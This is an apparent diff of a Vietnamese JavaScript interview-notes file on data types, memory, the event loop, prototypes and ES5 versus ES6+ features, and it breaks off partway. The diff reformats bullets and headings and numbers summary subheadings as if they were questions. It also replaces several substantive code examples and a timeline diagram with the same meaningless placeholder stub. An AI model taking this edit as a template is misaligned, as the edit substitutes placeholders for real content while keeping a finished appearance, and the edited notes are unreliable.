@@ -35,13 +35,14 @@ Mỗi mục: P1 = Tên câu hỏi; P2 = Trả lời ngắn gọn/chi tiết ở 
 - StructuredClone: native deep clone hiện đại (hỗ trợ Date, RegExp...), tránh dùng JSON hack nếu cần giữ kiểu phức tạp.
 
 ---
-## 01. 🚀 Q01: JavaScript Fundamentals Overview - Tổng Quan Nền Tảng  
 
-**P1: Tên câu hỏi:** 🚀 Q01: JavaScript Fundamentals Overview - Tổng Quan Nền Tảng  
+## 01. Q1: 🚀 Q01: JavaScript Fundamentals Overview - Tổng Quan Nền Tảng
 
-**P2: Trả lời (Senior):**
+### P1: Tên câu hỏi: 🚀 Q01: JavaScript Fundamentals Overview - Tổng Quan Nền Tảng
 
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
+### P2: Trả lời (Senior):
+
+## 02. Q2: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
 
 ### **🎯 Câu Trả Lời Ngắn Gọn (3-5 phút):**
 
@@ -50,34 +51,34 @@ Mỗi mục: P1 = Tên câu hỏi; P2 = Trả lời ngắn gọn/chi tiết ở 
 **🔑 5 Trụ Cột Nền Tảng:**
 
 1. **Kiểu Dữ Liệu & Bộ Nhớ**:
-   - 7 kiểu nguyên thủy (number, string, boolean, null, undefined, symbol, bigint) + Object
-   - Primitive = stack (theo giá trị) // Nguyên thủy lưu trong ngăn xếp, sao chép theo giá trị
-   - Reference = heap (theo tham chiếu) // Tham chiếu lưu trong đống, sao chép theo tham chiếu
-   - GC tự động dọn bộ nhớ (Mark-and-Sweep algorithm) // Thu gom rác tự động bằng thuật toán đánh dấu và quét
+- 7 kiểu nguyên thủy (number, string, boolean, null, undefined, symbol, bigint) + Object
+- Primitive = stack (theo giá trị) // Nguyên thủy lưu trong ngăn xếp, sao chép theo giá trị
+- Reference = heap (theo tham chiếu) // Tham chiếu lưu trong đống, sao chép theo tham chiếu
+- GC tự động dọn bộ nhớ (Mark-and-Sweep algorithm) // Thu gom rác tự động bằng thuật toán đánh dấu và quét
 
 2. **Execution Context & Scope**:
-   - Call Stack thực thi code đồng bộ (LIFO) // Ngăn xếp gọi thực thi mã đồng bộ, vào sau ra trước
-   - Scope chain: Global → Function → Block scope // Chuỗi phạm vi: toàn cục → hàm → khối
-   - Hoisting: `var` khởi tạo undefined, `let/const` trong TDZ // Nâng lên: var khởi tạo undefined, let/const trong vùng chết tạm thời
-   - Closure = hàm + môi trường từ vựng xung quanh // Bao đóng = hàm + môi trường xung quanh
+- Call Stack thực thi code đồng bộ (LIFO) // Ngăn xếp gọi thực thi mã đồng bộ, vào sau ra trước
+- Scope chain: Global → Function → Block scope // Chuỗi phạm vi: toàn cục → hàm → khối
+- Hoisting: `var` khởi tạo undefined, `let/const` trong TDZ // Nâng lên: var khởi tạo undefined, let/const trong vùng chết tạm thời
+- Closure = hàm + môi trường từ vựng xung quanh // Bao đóng = hàm + môi trường xung quanh
 
 3. **Bất Đồng Bộ (Event Loop)**:
-   - **Microtask Queue** (ưu tiên cao): Promise.then, queueMicrotask // Hàng đợi nhiệm vụ nhỏ (ưu tiên cao): lời hứa, nhiệm vụ nhỏ
-   - **Macrotask Queue** (ưu tiên thấp): setTimeout, setInterval // Hàng đợi nhiệm vụ lớn (ưu tiên thấp): đặt thời gian, khoảng thời gian
-   - Event Loop: Call Stack → Microtasks → UI Render → 1 Macrotask // Vòng lặp sự kiện: ngăn xếp gọi → nhiệm vụ nhỏ → hiển thị UI → 1 nhiệm vụ lớn
-   - Async patterns: Callbacks → Promises → Async/Await // Mẫu bất đồng bộ: gọi lại → lời hứa → bất đồng bộ/chờ
+- **Microtask Queue** (ưu tiên cao): Promise.then, queueMicrotask // Hàng đợi nhiệm vụ nhỏ (ưu tiên cao): lời hứa, nhiệm vụ nhỏ
+- **Macrotask Queue** (ưu tiên thấp): setTimeout, setInterval // Hàng đợi nhiệm vụ lớn (ưu tiên thấp): đặt thời gian, khoảng thời gian
+- Event Loop: Call Stack → Microtasks → UI Render → 1 Macrotask // Vòng lặp sự kiện: ngăn xếp gọi → nhiệm vụ nhỏ → hiển thị UI → 1 nhiệm vụ lớn
+- Async patterns: Callbacks → Promises → Async/Await // Mẫu bất đồng bộ: gọi lại → lời hứa → bất đồng bộ/chờ
 
 4. **OOP & Prototypes**:
-   - Prototype chain: mỗi object có `__proto__` trỏ đến prototype // Chuỗi nguyên mẫu: mỗi đối tượng có __proto__ trỏ đến nguyên mẫu
-   - Class = syntactic sugar cho prototype-based inheritance // Lớp = đường cú pháp cho kế thừa dựa trên nguyên mẫu
-   - `this` binding: new → explicit (call/apply/bind) → implicit → default // Ràng buộc this: mới → rõ ràng (gọi/áp dụng/ràng buộc) → ngầm → mặc định
+- Prototype chain: mỗi object có `__proto__` trỏ đến prototype // Chuỗi nguyên mẫu: mỗi đối tượng có __proto__ trỏ đến nguyên mẫu
+- Class = syntactic sugar cho prototype-based inheritance // Lớp = đường cú pháp cho kế thừa dựa trên nguyên mẫu
+- `this` binding: new → explicit (call/apply/bind) → implicit → default // Ràng buộc this: mới → rõ ràng (gọi/áp dụng/ràng buộc) → ngầm → mặc định
 
 5. **Modern JavaScript (ES6+)**:
-   - `let/const` block scope thay `var` // Chú giải: let/const phạm vi khối thay var
-   - Arrow functions = lexical `this` // Hàm mũi tên = this từ vựng
-   - Destructuring, spread/rest operators // Phân rã, toán tử trải/rest
-   - Modules (import/export), classes // Mô-đun (nhập/xuất), lớp
-   - Promise, async/await cho async code // Lời hứa, bất đồng bộ/chờ cho mã bất đồng bộ
+- `let/const` block scope thay `var` // Chú giải: let/const phạm vi khối thay var
+- Arrow functions = lexical `this` // Hàm mũi tên = this từ vựng
+- Destructuring, spread/rest operators // Phân rã, toán tử trải/rest
+- Modules (import/export), classes // Mô-đun (nhập/xuất), lớp
+- Promise, async/await cho async code // Lời hứa, bất đồng bộ/chờ cho mã bất đồng bộ
 
 **⚠️ Lỗi Thường Gặp:**
 - Mutate objects/arrays trực tiếp → dùng spread hoặc immutable methods // Đột biến đối tượng/mảng trực tiếp → dùng trải hoặc phương thức bất biến
@@ -95,13 +96,14 @@ Mỗi mục: P1 = Tên câu hỏi; P2 = Trả lời ngắn gọn/chi tiết ở 
 
 ---
 ---
-## 02. 🎯 Q02: Data Types & Memory Management - Tổng Hợp Toàn Diện  
 
-**P1: Tên câu hỏi:** 🎯 Q02: Data Types & Memory Management - Tổng Hợp Toàn Diện  
+## 03. Q3: 🎯 Q02: Data Types & Memory Management - Tổng Hợp Toàn Diện
 
-**P2: Trả lời (Senior):**
+### P1: Tên câu hỏi: 🎯 Q02: Data Types & Memory Management - Tổng Hợp Toàn Diện
 
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
+### P2: Trả lời (Senior):
+
+## 04. Q4: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
 
 ### **🎯 Câu Trả Lời Ngắn Gọn (2-3 phút):**
 
@@ -109,52 +111,55 @@ Mỗi mục: P1 = Tên câu hỏi; P2 = Trả lời ngắn gọn/chi tiết ở 
 
 **📦 Nguyên Thủy vs Tham Chiếu:**
 - **Nguyên thủy** (number, string, boolean, undefined, null, symbol, bigint):
-  - Lưu theo GIÁ TRỊ trong stack. // Lưu giá trị thực tế trong ngăn xếp
-  - Không thay đổi được → gán lại tạo giá trị mới. // Không thể sửa đổi, gán lại tạo bản sao mới
-  - Copy theo giá trị → các bản sao độc lập. // Sao chép giá trị, bản sao không liên kết
+- Lưu theo GIÁ TRỊ trong stack. // Lưu giá trị thực tế trong ngăn xếp
+- Không thay đổi được → gán lại tạo giá trị mới. // Không thể sửa đổi, gán lại tạo bản sao mới
+- Copy theo giá trị → các bản sao độc lập. // Sao chép giá trị, bản sao không liên kết
 - **Tham chiếu** (object, array, function):
-  - Lưu theo THAM CHIẾU trong heap. // Lưu địa chỉ trỏ đến vùng nhớ heap
-  - Thay đổi được → sửa trực tiếp. // Có thể sửa đổi nội dung
-  - Copy theo tham chiếu → trỏ đến cùng object. // Sao chép địa chỉ, cùng trỏ đến một object
+- Lưu theo THAM CHIẾU trong heap. // Lưu địa chỉ trỏ đến vùng nhớ heap
+- Thay đổi được → sửa trực tiếp. // Có thể sửa đổi nội dung
+- Copy theo tham chiếu → trỏ đến cùng object. // Sao chép địa chỉ, cùng trỏ đến một object
 
 **🔑 Khái Niệm Cốt Lõi:**
 1. **== vs ===**:
-   - `==`: So sánh lỏng → chuyển đổi kiểu tự động (vd: `"5" == 5` → true). // So sánh lỏng lẻo, tự động chuyển kiểu
-   - `===`: So sánh nghiêm ngặt → không chuyển kiểu (vd: `"5" === 5` → false). // So sánh nghiêm ngặt, không chuyển kiểu
-   - Thực hành tốt: Luôn dùng `===` trừ khi kiểm tra null/undefined. // Luôn dùng nghiêm ngặt trừ khi kiểm tra null/undefined
+- `==`: So sánh lỏng → chuyển đổi kiểu tự động (vd: `"5" == 5` → true). // So sánh lỏng lẻo, tự động chuyển kiểu
+- `===`: So sánh nghiêm ngặt → không chuyển kiểu (vd: `"5" === 5` → false). // So sánh nghiêm ngặt, không chuyển kiểu
+- Thực hành tốt: Luôn dùng `===` trừ khi kiểm tra null/undefined. // Luôn dùng nghiêm ngặt trừ khi kiểm tra null/undefined
 
 2. **null vs undefined**:
-   - `undefined`: Biến chưa được assign value (default). // Biến chưa được gán giá trị (mặc định)
-   - `null`: Intentionally empty value (developer set). // Giá trị trống có chủ đích (developer đặt)
-   - `typeof null` → "object" (JavaScript bug legacy). // typeof null trả về "object" (lỗi cũ của JavaScript)
+- `undefined`: Biến chưa được assign value (default). // Biến chưa được gán giá trị (mặc định)
+- `null`: Intentionally empty value (developer set). // Giá trị trống có chủ đích (developer đặt)
+- `typeof null` → "object" (JavaScript bug legacy). // typeof null trả về "object" (lỗi cũ của JavaScript)
 
 3. **Shallow Copy vs Deep Copy**:
-   - **Shallow**: Copy top-level properties only → nested objects vẫn reference. // Sao chép nông: chỉ sao chép thuộc tính cấp trên, object lồng vẫn tham chiếu
-     ```js
-     const shallow = { ...obj }; // Spread - Toán tử trải
-     const shallow2 = Object.assign({}, obj); // Chú giải: Object.assign
-     ```
-   - **Deep**: Copy recursively tất cả levels → independent clone. // Sao chép sâu: sao chép đệ quy tất cả cấp → bản sao độc lập
-     ```js
-     const deep = structuredClone(obj); // Native (modern) - Tự nhiên (hiện đại)
-     const deep2 = JSON.parse(JSON.stringify(obj)); // Hack (lose functions, dates) - Hack (mất hàm, ngày tháng)
-     ```
+- **Shallow**: Copy top-level properties only → nested objects vẫn reference. // Sao chép nông: chỉ sao chép thuộc tính cấp trên, object lồng vẫn tham chiếu
+
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
+
+- **Deep**: Copy recursively tất cả levels → independent clone. // Sao chép sâu: sao chép đệ quy tất cả cấp → bản sao độc lập
+
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
 4. **Type Checking**:
-   - `typeof`: Check primitive types (`typeof "hello"` → "string"). // Kiểm tra kiểu nguyên thủy
-   - `instanceof`: Check object types (`[] instanceof Array` → true). // Kiểm tra kiểu object
-   - `Array.isArray()`: Check arrays specifically. // Kiểm tra mảng cụ thể
-   - `Object.prototype.toString.call()`: Most accurate (e.g., `[object Date]`). // Chính xác nhất
+- `typeof`: Check primitive types (`typeof "hello"` → "string"). // Kiểm tra kiểu nguyên thủy
+- `instanceof`: Check object types (`[] instanceof Array` → true). // Kiểm tra kiểu object
+- `Array.isArray()`: Check arrays specifically. // Kiểm tra mảng cụ thể
+- `Object.prototype.toString.call()`: Most accurate (e.g., `[object Date]`). // Chính xác nhất
 
 **♻️ Memory Management & GC:**
 - **Stack**: Primitive values, function calls (LIFO, fast, limited size). // Ngăn xếp: giá trị nguyên thủy, lời gọi hàm (vào sau ra trước, nhanh, kích thước giới hạn)
 - **Heap**: Objects, arrays (larger, slower, managed by GC). // Đống: object, mảng (lớn hơn, chậm hơn, quản lý bởi GC)
 - **Garbage Collection**: Mark-and-sweep algorithm → auto free unreachable objects. // Thu gom rác: thuật toán đánh dấu và quét → tự động giải phóng object không thể truy cập
 - **Memory Leaks**:
-  - Global variables không cleanup. // Biến toàn cục không dọn dẹp
-  - Event listeners không remove. // Trình nghe sự kiện không xóa
-  - Closures giữ reference đến large objects. // Bao đóng giữ tham chiếu đến object lớn
-  - Detached DOM nodes. // Nút DOM tách rời
+- Global variables không cleanup. // Biến toàn cục không dọn dẹp
+- Event listeners không remove. // Trình nghe sự kiện không xóa
+- Closures giữ reference đến large objects. // Bao đóng giữ tham chiếu đến object lớn
+- Detached DOM nodes. // Nút DOM tách rời
 
 **⚠️ Common Pitfalls:**
 - **Mutating objects**: `arr.push()` modify original → dùng immutable methods (`[...arr, item]`). // Đột biến object: arr.push() sửa gốc → dùng phương thức bất biến
@@ -175,13 +180,14 @@ Mỗi mục: P1 = Tên câu hỏi; P2 = Trả lời ngắn gọn/chi tiết ở 
 
 ---
 ---
-## 03. ⚡ Q03: ES5 vs ES6+ Features - So Sánh Chi Tiết & Cách Hoạt Động  
 
-**P1: Tên câu hỏi:** ⚡ Q03: ES5 vs ES6+ Features - So Sánh Chi Tiết & Cách Hoạt Động  
+## 05. Q5: ⚡ Q03: ES5 vs ES6+ Features - So Sánh Chi Tiết & Cách Hoạt Động
 
-**P2: Trả lời (Senior):**
+### P1: Tên câu hỏi: ⚡ Q03: ES5 vs ES6+ Features - So Sánh Chi Tiết & Cách Hoạt Động
 
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
+### P2: Trả lời (Senior):
+
+## 06. Q6: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
 
 ### **🎯 Câu Trả Lời Ngắn Gọn (2-3 phút):**
 
@@ -263,738 +269,16 @@ Mỗi mục: P1 = Tên câu hỏi; P2 = Trả lời ngắn gọn/chi tiết ở 
 
 **🎯 Timeline & Browser Support:**
 
-```
-┌─────────────────────────────────────────────────────────────────────────┐
-│                    JAVASCRIPT EVOLUTION TIMELINE                         │
-├─────────────────────────────────────────────────────────────────────────┤
-│                                                                          │
-│  📅 ES5 (2009) - Stable, Universal Support                              │
-│     ✅ All browsers (IE9+)                                              │
-│     ✅ No transpilation needed                                          │
-│     ❌ Verbose syntax, limited features                                 │
-│                                                                          │
-│  📅 ES6/ES2015 (2015) - Major Update                                    │
-│     • Classes, Modules, Arrow Functions                                 │
-│     • let/const, Template Literals                                      │
-│     • Destructuring, Spread/Rest                                        │
-│     • Promises, Symbols, Iterators                                      │
-│     ✅ Modern browsers (Chrome 51+, Firefox 54+, Safari 10+)           │
-│     ⚠️  Needs Babel for IE11                                            │
-│                                                                          │
-│  📅 ES2016-ES2023 (Yearly Updates)                                      │
-│     • Async/Await (ES2017)                                              │
-│     • Optional Chaining ?. (ES2020)                                     │
-│     • Nullish Coalescing ?? (ES2020)                                    │
-│     • BigInt, Dynamic Import                                            │
-│     • Private Fields, Top-level await                                   │
-│     ✅ Evergreen browsers auto-update                                   │
-│                                                                          │
-└─────────────────────────────────────────────────────────────────────────┘
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **Code Example - Comprehensive Comparison:**
 
-```typescript
- // Chú giải: ============================================
- // Chú giải: 1. VARIABLES - var vs let/const
- // Chú giải: ============================================
-
- // Được nâng lên (hoisting): khai báo được chuyển lên đầu phạm vi; `var` khởi tạo với `undefined`, còn `let/const` nằm trong vùng chết tạm thời (TDZ).
-// Cách hoạt động: var được hoist lên đầu function scope
-function es5Variables() {
-  console.log(x); // undefined (hoisted nhưng chưa gán giá trị)
-  var x = 10; // Function scoped - accessible trong toàn bộ function
-
-  if (true) {
-    var x = 20; // CÙNG biến x (không tạo scope mới)
-  }
-
-  console.log(x); // 20 (bị ghi đè bởi if block)
-
-  // var có thể redeclare
-  var x = 30; // ✅ OK - không error
-  console.log(x); // Chú giải: 30
-}
-
- // Vùng chết tạm thời (TDZ): `let/const` không thể truy cập trước khi khởi tạo, gây `ReferenceError` nếu truy cập sớm.
-// Cách hoạt động: let/const chỉ tồn tại trong {} block, có TDZ
-function es6Variables() {
- // Tham chiếu: biến chứa địa chỉ tới object trong heap; `const` khóa tham chiếu chứ không khóa nội dung object.
-  // Temporal Dead Zone (TDZ) - từ đầu block đến khi declare
-
-  let y = 10; // Block scoped - chỉ trong function này
-  const z = 100; // Immutable reference - không thể reassign
-
-  if (true) {
-    let y = 20; // BIẾN MỚI - scope riêng trong if block
-    const z = 200; // BIẾN MỚI - scope riêng
-
-    console.log(y); // 20 (biến local của if)
-    console.log(z); // Chú giải: 200
-  }
-
-  console.log(y); // 10 (biến của function scope, không bị ảnh hưởng)
-  console.log(z); // Chú giải: 100
-
- // Chú giải: let y = 30;  // ❌ SyntaxError: Identifier 'y' has already been declared
- // Chú giải: z = 300;     // ❌ TypeError: Assignment to constant variable
-
- // Chú giải: `const` với object:
-  // - `const` KHÓA reference (binding) — không thể gán lại biến (`obj = {...}` sẽ lỗi)
-  // - NHƯNG nội dung object (properties) VẪN có thể thay đổi (mutable)
-  // => Nếu muốn object bất biến, dùng `Object.freeze()` (chỉ shallow), pattern bất biến hoặc thư viện như Immer
-  const obj = { name: 'John' };
-  obj.name = 'Jane'; // ✅ OK - thay đổi property vẫn hợp lệ
-  // obj = {};      // ❌ Error - không thể reassign reference
-}
-
-// Hoisting Comparison (Cách hoạt động của hoisting)
-console.log('=== VAR HOISTING ===');
-console.log(varVariable); // Được nâng lên (hoisting): khai báo được chuyển lên đầu phạm vi; `var` khởi tạo với `undefined`, còn `let/const` nằm trong vùng chết tạm thời (TDZ).
-var varVariable = 'ES5';
-
-console.log('=== LET/CONST HOISTING ===');
- // Vùng chết tạm thời (TDZ): `let/const` không thể truy cập trước khi khởi tạo, gây `ReferenceError` nếu truy cập sớm. Tham chiếu: biến chứa địa chỉ tới object trong heap; `const` khóa tham chiếu chứ không khóa nội dung object.
-let letVariable = 'ES6';
- // Chú giải: const constVariable; // ❌ SyntaxError - const phải init ngay
-
- // Chú giải: ============================================
- // Hàm mũi tên không có own `this` và không thể dùng làm constructor; thích hợp cho callback giữ `this` lexical.
- // Chú giải: ============================================
-
-// 🔴 ES5 - Regular Functions (có own this binding)
-// Cách hoạt động: this binding dynamic, phụ thuộc vào cách gọi
-var Calculator = {
-  value: 0,
-
- // Chú giải: Method với regular function
-  add: function (num) {
-    this.value += num; // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh.
-    return this.value;
-  },
-
- // Chú giải: Callback problem
-  delayedAdd: function (num) {
-    setTimeout(function () {
-      // this ở đây = window (hoặc undefined trong strict mode)
-      // Không phải Calculator object!
-      console.log(this); // Chú giải: window/undefined
-      // this.value += num; // ❌ Error hoặc NaN
-    }, 1000);
-  },
-
-  // ES5 solution: bind hoặc that = this
-  delayedAddFixed: function (num) {
-    var that = this; // Tham chiếu: biến chứa địa chỉ tới object trong heap; `const` khóa tham chiếu chứ không khóa nội dung object.
-    setTimeout(function () {
-      that.value += num; // ✅ Hoạt động
-    }, 1000);
-  },
-
-  // Hoặc dùng bind
-  delayedAddBind: function (num) {
-    setTimeout(
-      function () {
-        this.value += num; // ✅ Hoạt động vì đã bind
-      }.bind(this),
-      1000
-    );
-  },
-};
-
- // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh. Hàm mũi tên không có own `this` và không thể dùng làm constructor; thích hợp cho callback giữ `this` lexical.
-// Cách hoạt động: Arrow function KHÔNG có own this, inherit từ parent scope
-const ModernCalculator = {
-  value: 0,
-
- // Chú giải: Method shorthand syntax
-  add(num: number) {
-    this.value += num;
-    return this.value;
-  },
-
-  // Arrow function trong callback - this tự động đúng
-  delayedAdd(num: number) {
-    setTimeout(() => {
- // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh.
-      this.value += num; // ✅ Hoạt động perfect
-    }, 1000);
-  },
-
-  // Arrow function không thể dùng làm constructor
-  // MyClass: () => { } // ❌ Không có prototype, không thể new
-};
-
- // Hàm mũi tên không có own `this` và không thể dùng làm constructor; thích hợp cho callback giữ `this` lexical.
-const simple = (x: number) => x * 2; // Trong arrow function với block `{ }` phải dùng `return` để trả giá trị; với expression có thể trả ngầm (implicit return).
-const withBlock = (x: number) => {
-  const result = x * 2;
-  return result; // Trong arrow function với block `{ }` phải dùng `return` để trả giá trị; với expression có thể trả ngầm (implicit return).
-};
-const noParams = () => console.log('Hello'); // Chú giải: No parameters
-const oneParam = (x) => x * 2; // Single param - có thể bỏ ()
-const multiParams = (x: number, y: number) => x + y; // Chú giải: Multiple params - cần ()
-const returnObject = () => ({ name: 'John' }); // Trong arrow function với block `{ }` phải dùng `return` để trả giá trị; với expression có thể trả ngầm (implicit return).
-
- // Chú giải: ============================================
- // Nguyên mẫu (prototype): cơ chế kế thừa theo chuỗi trong JS; `class` chỉ là cú pháp sugar trên prototype.
- // Chú giải: ============================================
-
- // Nguyên mẫu (prototype): cơ chế kế thừa theo chuỗi trong JS; `class` chỉ là cú pháp sugar trên prototype.
-// Cách hoạt động: Constructor function + prototype chain
-function Animal(name) {
- // Constructor: hàm/ phương thức dùng với `new` để khởi tạo instance; trong `class` phải gọi `super()` trước khi dùng `this` nếu có kế thừa.
-  this.name = name; // Chú giải: Instance property
-}
-
-// Methods trên prototype (share giữa instances)
-Animal.prototype.speak = function () {
-  console.log(this.name + ' makes a sound');
-};
-
- // Chú giải: Static methods
-Animal.createAnimal = function (name) {
-  return new Animal(name);
-};
-
- // Nguyên mẫu (prototype): cơ chế kế thừa theo chuỗi trong JS; `class` chỉ là cú pháp sugar trên prototype.
-function Dog(name, breed) {
-  Animal.call(this, name); // Constructor: hàm/ phương thức dùng với `new` để khởi tạo instance; trong `class` phải gọi `super()` trước khi dùng `this` nếu có kế thừa.
-  this.breed = breed;
-}
-
- // Nguyên mẫu (prototype): cơ chế kế thừa theo chuỗi trong JS; `class` chỉ là cú pháp sugar trên prototype.
-Dog.prototype = Object.create(Animal.prototype);
-Dog.prototype.constructor = Dog; // Tham chiếu: biến chứa địa chỉ tới object trong heap; `const` khóa tham chiếu chứ không khóa nội dung object. Constructor: hàm/ phương thức dùng với `new` để khởi tạo instance; trong `class` phải gọi `super()` trước khi dùng `this` nếu có kế thừa.
-
- // Chú giải: Override method
-Dog.prototype.speak = function () {
-  console.log(this.name + ' barks!');
-};
-
-const dog = new Dog('Rex', 'Labrador');
-dog.speak(); // Chú giải: "Rex barks!"
-
- // Chú giải: 🟢 ES6+ - Class Syntax (Syntactic Sugar)
-// Cách hoạt động: Bên trong vẫn là prototype, nhưng syntax dễ đọc hơn
-class ModernAnimal {
- // Chú giải: Class fields (ES2022)
-  species = 'Unknown'; // Chú giải: Public field
-
- // Constructor: hàm/ phương thức dùng với `new` để khởi tạo instance; trong `class` phải gọi `super()` trước khi dùng `this` nếu có kế thừa.
-  constructor(public name: string) {
- // Chú giải: Parameter properties (TypeScript)
-    // Tự động tạo this.name = name
-  }
-
-  // Instance method (trên prototype)
-  speak() {
-    console.log(`${this.name} makes a sound`);
-  }
-
-  // Static method (trên class itself)
-  static createAnimal(name: string) {
-    return new ModernAnimal(name);
-  }
-
- // Chú giải: Getter
-  get info() {
-    return `Animal: ${this.name}`;
-  }
-
- // Chú giải: Setter
-  set info(value: string) {
-    this.name = value.replace('Animal: ', '');
-  }
-}
-
- // Chú giải: Inheritance với extends
-class ModernDog extends ModernAnimal {
-  constructor(name: string, public breed: string) {
-    super(name); // Gọi parent constructor - BẮT BUỘC
-    // Phải call super() trước khi dùng this
-  }
-
- // Chú giải: Override method
-  speak() {
-    console.log(`${this.name} barks!`);
-  }
-
- // Chú giải: Call parent method
-  speakLikeParent() {
-    super.speak(); // Chú giải: Gọi Animal.speak()
-  }
-
- // Trường private (ví dụ `#field`) chỉ truy cập được trong class, không thể truy cập từ bên ngoài. Trường private bắt đầu bằng `#` chỉ có thể truy cập trong class, gây lỗi khi truy cập ngoài.
-  #privateField = 'secret'; // Chú giải: Chỉ accessible trong class
-
-  getPrivate() {
-    return this.#privateField; // Chú giải: ✅ OK
-  }
-}
-
-const modernDog = new ModernDog('Rex', 'Labrador');
-modernDog.speak(); // Chú giải: "Rex barks!"
- // Trường private (ví dụ `#field`) chỉ truy cập được trong class, không thể truy cập từ bên ngoài. Trường private bắt đầu bằng `#` chỉ có thể truy cập trong class, gây lỗi khi truy cập ngoài.
-
- // Chú giải: ============================================
- // Chú giải: 4. TEMPLATE LITERALS vs String Concatenation
- // Chú giải: ============================================
-
- // Chú giải: 🔴 ES5 - String Concatenation (verbose, error-prone)
-var name = 'John';
-var age = 25;
-var city = 'Ha Noi';
-
- // Chú giải: Single line
-var message = 'Hello ' + name + ', you are ' + age + ' years old';
-
-// Multi-line (phải dùng \n và +)
-var multiLine =
-  'Name: ' +
-  name +
-  '\n' +
-  'Age: ' +
-  age +
-  '\n' +
-  'City: ' +
-  city;
-
- // Chú giải: HTML generation (nightmare)
-var html =
-  '<div class="user">' +
-  '<h2>' +
-  name +
-  '</h2>' +
-  '<p>Age: ' +
-  age +
-  '</p>' +
-  '<p>City: ' +
-  city +
-  '</p>' +
-  '</div>';
-
- // Chú giải: 🟢 ES6+ - Template Literals (clean, readable)
-// Cách hoạt động: Backticks `` cho phép embedded expressions ${} và multi-line
-const modernMessage = `Hello ${name}, you are ${age} years old`;
-
-// Multi-line (tự nhiên, giữ nguyên indentation)
-const modernMultiLine = `
-  Name: ${name}
-  Age: ${age}
-  City: ${city}
-`;
-
-// Expression trong template (không chỉ variables)
-const calculation = `2 + 2 = ${2 + 2}`; // Chú giải: "2 + 2 = 4"
-const conditional = `Status: ${age >= 18 ? 'Adult' : 'Minor'}`; // Chú giải: Ternary
-const methodCall = `Upper: ${name.toUpperCase()}`; // Chú giải: Method call
-
-// HTML generation (dễ đọc hơn nhiều)
-const modernHtml = `
-  <div class="user">
-    <h2>${name}</h2>
-    <p>Age: ${age}</p>
-    <p>City: ${city}</p>
-  </div>
-`;
-
- // Chú giải: Tagged Templates (advanced feature)
-function highlight(strings: TemplateStringsArray, ...values: any[]) {
-  return strings.reduce((result, str, i) => {
-    return result + str + (values[i] ? `<mark>${values[i]}</mark>` : '');
-  }, '');
-}
-
-const highlighted = highlight`Hello ${name}, you are ${age} years old`;
- // Chú giải: "Hello <mark>John</mark>, you are <mark>25</mark> years old"
-
- // Chú giải: ============================================
- // Chú giải: 5. DESTRUCTURING - Elegant Data Extraction
- // Chú giải: ============================================
-
-const user = {
-  name: 'John Doe',
-  age: 30,
-  address: {
-    city: 'Ha Noi',
-    country: 'Vietnam',
-  },
-  hobbies: ['coding', 'reading'],
-};
-
- // Chú giải: 🔴 ES5 - Manual Assignment (verbose, repetitive)
-var userName = user.name;
-var userAge = user.age;
-var userCity = user.address.city;
-var userCountry = user.address.country;
-var firstHobby = user.hobbies[0];
-var secondHobby = user.hobbies[1];
-
- // Chú giải: 🟢 ES6+ - Destructuring (concise, readable)
- // Chú giải: Object destructuring
-const { name: userName2, age: userAge2 } = user; // Chú giải: Rename variables
-
- // Chú giải: Nested destructuring
-const {
-  address: { city, country },
-} = user;
-
- // Chú giải: Array destructuring
-const [firstHobby2, secondHobby2] = user.hobbies;
-
- // Chú giải: Default values
-const { email = 'no-email@example.com' } = user; // email không tồn tại → dùng default
-
-// Rest properties (lấy phần còn lại)
-const { name: n, ...rest } = user; // Chú giải: rest = { age, address, hobbies }
-
- // Chú giải: Function parameter destructuring
-function greetUser({ name, age }: { name: string; age: number }) {
-  console.log(`Hello ${name}, ${age} years old`);
-}
-
-greetUser(user); // Truyền object, tự động destructure
-
- // Chú giải: Array destructuring với skip
-const numbers = [1, 2, 3, 4, 5];
-const [first, , third] = numbers; // Chú giải: Skip second element
-
- // Chú giải: Swap variables (elegant)
-let a = 1,
-  b = 2;
-[a, b] = [b, a]; // a=2, b=1 (không cần temp variable)
-
- // Chú giải: ============================================
- // Chú giải: 6. SPREAD & REST OPERATORS
- // Chú giải: ============================================
-
- // Chú giải: 🔴 ES5 - Array/Object Operations (cumbersome)
-var arr1 = [1, 2, 3];
-var arr2 = [4, 5, 6];
-
- // Chú giải: Concatenate arrays
-var combined = arr1.concat(arr2); // Chú giải: [1,2,3,4,5,6]
-
- // Chú giải: Copy array
-var copy = arr1.slice(); // Chú giải: [1,2,3]
-
- // Chú giải: Copy object
-var obj1 = { a: 1, b: 2 };
-var obj2 = Object.assign({}, obj1); // Chú giải: { a: 1, b: 2 }
-
- // Chú giải: Function với variable arguments
-function sum() {
-  var args = Array.prototype.slice.call(arguments); // Chú giải: Convert arguments to array
-  return args.reduce(function (total, num) {
-    return total + num;
-  }, 0);
-}
-
- // Chú giải: 🟢 ES6+ - Spread & Rest (intuitive, powerful)
-// Cách hoạt động: ... operator "spreads" iterable elements
-
-// Spread arrays (phân rã array thành individual elements)
-const spreadArr1 = [1, 2, 3];
-const spreadArr2 = [4, 5, 6];
-const spreadCombined = [...spreadArr1, ...spreadArr2]; // Chú giải: [1,2,3,4,5,6]
-
- // Sao chép nông: chỉ sao chép thuộc tính cấp trên; object lồng bên trong vẫn giữ tham chiếu chung.
-const spreadCopy = [...spreadArr1]; // Chú giải: [1,2,3]
-
- // Chú giải: Add elements
-const withExtra = [...spreadArr1, 4, 5]; // Chú giải: [1,2,3,4,5]
-const atBeginning = [0, ...spreadArr1]; // Chú giải: [0,1,2,3]
-
-// Spread objects (phân rã object properties)
-const spreadObj1 = { a: 1, b: 2 };
